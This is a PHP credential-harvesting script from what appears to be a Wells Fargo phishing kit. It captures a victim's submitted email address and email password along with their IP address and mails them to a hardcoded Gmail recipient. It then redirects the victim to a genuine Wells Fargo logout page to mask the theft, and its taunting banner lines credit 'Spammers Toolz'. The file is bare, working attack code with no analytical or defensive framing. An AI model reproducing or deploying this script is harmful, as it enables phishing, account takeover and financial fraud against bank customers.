<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Wells ScAm Inf0 (1) || :------\n";
$message .= "Email: ".$_POST['user']."\n";
$message .= "Email password ( not Wells Fargo Password: ".$_POST['pass']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "kaypresh@gmail.com";
$subject = "WELLSEMAIL | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://connect.secure.wellsfargo.com/auth/secureLogout?st=1534888581&SAMLart=AAQCBeoEQCR14WDgSxaU4QNGCHpGcoS1aUFjKPOTaCWmJOTNXgipbB3D9TA%3D
");
?>


